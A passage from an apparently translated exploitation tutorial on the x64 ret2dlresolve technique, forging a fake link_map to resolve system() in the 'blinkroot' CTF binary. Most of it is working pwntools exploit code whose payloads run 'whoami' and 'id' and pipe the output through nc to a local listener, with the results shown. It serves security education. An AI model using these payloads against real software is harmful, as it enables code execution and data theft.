    linkmap += p64(0)
    linkmap += p64(6) + p64(known_function_ptr-8)

    linkmap = linkmap.ljust(0x68, 'A')

    linkmap += p64(fake_linkmap_addr)

    linkmap += p64(fake_linkmap_addr + 0x50)

    linkmap = linkmap.ljust(0xf8, 'A')
    linkmap += p64(fake_linkmap_addr + 8)

    return linkmap

# .got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
# .got.plt:0000000000600B48 qword_600B48    dq 0    
target_addr = 0x600B40
data_addr = 0x600BC0
offset = target_addr-data_addr
payload = p64(offset & (2**64 - 1))
payload += p64(data_addr+43)
payload += "whoami | nc 127.0.0.1 8080\x00"

payload +=ret2dlresolve_with_fakelinkmap_x64(elf,data_addr+len(payload), elf.got["__libc_start_main"],libc.sym["system"]-libc.sym["__libc_start_main"])
payload = payload.ljust(1024,'A')
# gdb.attach(io)
io.send(payload)
io.interactive()
```

Note that `data_addr+43` here is the address of the forged linkmap. The execution result is as follows

```
❯ nc -l 127.0.0.1 8080
iromise
```

The above approach forges link_map's l_addr as the offset between the target function and the resolved function.

Based on the previous introduction, we can also forge l_addr as the address of the resolved function, and st_value as the offset between the resolved function and the target function.

```
value = l->l_addr + sym->st_value
```

Here, since the bss segment data is located not far below `.got.plt`, when we control the linkmap address to be near the got table, we also need to use several dynamic table pointers from link_map, with offsets starting from 0x68. Therefore, we need to carefully construct the corresponding data. Here we choose to forge link_map at 0x600B80.

```
0x600B80-->link_map
0x600BC0-->data    
0x600BC8-->data+8
0x600BD0-->data+16, args of puts
0x600BE8-->data+24
```

Therefore, the maximum length of the puts parameter we can control is 0x18.

```python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
io = process("blinkroot")
elf = ELF("blinkroot")
libc = ELF("./libc.so.6")


def ret2dlresolve_with_fakelinkmap_x64(libc, fake_linkmap_addr, offset_of_two_addr):
    '''
    libc: is the ELF object

    fake_linkmap_addr: the address of the fake linkmap

    offset_of_two_addr: target_function_addr - *(known_function_ptr), where
                        target_function_addr is the function you want to execute

    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=1

    linkmap:
      P_DT_STRTAB, pointer for DT_STRTAB
        0x68: fake a pointer, e.g., fake_linkmap_addr
      p_DT_SYMTAB, pointer for fake_DT_SYMTAB
        0x70: fake_linkmap_addr + 0xc0
      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x78
        0x78: 17, tag of the JMPREL
        0x80: fake_linkmap_add+0x88, pointer of the fake JMPREL
      fake_JMPREL, addr = fake_linkmap_addr + 0x88
        0x88: padding for the relocation entry of idx=0
        0x90: padding for the relocation entry of idx=0
        0x98: padding for the relocation entry of idx=0
        0xa0: p_r_offset, offset pointer to the resloved addr
        0xa8: r_info
        0xb0: append
      resolved addr
        0xb8: r_offset
      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0xc0
        0xc0: 6, tag of the DT_SYMTAB
        0xc8: p_fake_symbol_table; here we can still use the fake r_info to set the index of symbol to 0
      fake_SYMTAB, addr = fake_linkmap_addr + 0xd0
        0xd0: 0x0000030000000000
        0xd8: offset_of_two_addr
        0xe0: fake st_size
      p_DT_JMPREL, pointer for fake_DT_JMPREL
        0xf8: fake_linkmap_addr + 0x78
    '''
    linkmap = p64(fake_linkmap_addr)
    linkmap += p64(fake_linkmap_addr+0xc0)

    linkmap += p64(17) + p64(fake_linkmap_addr + 0x88)
    linkmap += p64(0)*3
    # here we set p_r_offset = libc.sym["__free_hook"]-libc.sym["__libc_start_main"]
    # as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = __libc_start_main_addr
    linkmap += p64((libc.sym["__free_hook"]-libc.sym["__libc_start_main"]) & (2**64 - 1)) + p64(0x7) + p64(0)

    linkmap += p64(0)

    linkmap += p64(6) + p64(fake_linkmap_addr + 0xd0)

    linkmap += p64(0x0000030000000000) + \
        p64(offset_of_two_addr & (2**64 - 1))+p64(0)

    linkmap = linkmap.ljust(0xf8-0x68, 'A')
    linkmap += p64(fake_linkmap_addr + 0x78)

    return linkmap


# .got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
# .got.plt:0000000000600B48 qword_600B48    dq 0
target_addr = 0x600B40
data_addr = 0x600BC0
offset = target_addr-data_addr
payload = p64(offset & (2**64 - 1))
payload += p64(elf.got["__libc_start_main"])
payload += "id|nc 127.0.0.1 8080\x00".ljust(0x18,'a')
payload += ret2dlresolve_with_fakelinkmap_x64(libc, elf.got["__libc_start_main"], libc.sym["system"]-libc.sym["__libc_start_main"])
payload = payload.ljust(1024, 'A')
# gdb.attach(io)
io.send(payload)
io.interactive()
```

Note that when forging the linkmap, we start constructing from offset 0x68, so at the end we align with `linkmap.ljust(0xf8-0x68, 'A')`.

Execution result

```shell
❯ nc -l 127.0.0.1 8080
uid=1000(iromise) gid=1000(iromise)...
```

## Summary

|              | Modify dynamic section content | Modify relocation table entry position                       | Forge linkmap                                        |
| ------------ | --------------------- | ------------------------------------------------------------ | ---------------------------------------------------- |
| Main prerequisites | None                  | None                                                         | Requires libc when no info leak available            |
| Applicable cases   | NO RELRO              | NO RELRO, Partial RELRO                                      | NO RELRO, Partial RELRO                              |
| Key notes    |                       | Ensure version check passes; ensure relocation position is writable; ensure relocation entries, symbol table, and string table correspond correctly | Ensure relocation position is writable; focus on forging relocation entries and symbol table |

In general, the dynamic sections most relevant to the ret2dlresolve attack are

- DT_JMPREL
- DT_SYMTAB
- DT_STRTAB
- DT_VERSYM

## Challenges

- pwnable.kr unexploitable
- pwnable.tw unexploitable
- 0CTF 2018 babystack
- 0CTF 2018 blackhole

## References

1. http://pwn4.fun/2016/11/09/Return-to-dl-resolve/ — clear and thorough.
2. https://www.math1as.com/index.php/archives/341/
3. https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/
4. https://blog.csdn.net/seaaseesa/article/details/104478081
5. https://github.com/pwning/public-writeup/blob/master/hitcon2015/pwn300-readable/writeup.md
6. https://github.com/pwning/public-writeup/tree/master/hitcon2015/pwn200-blinkroot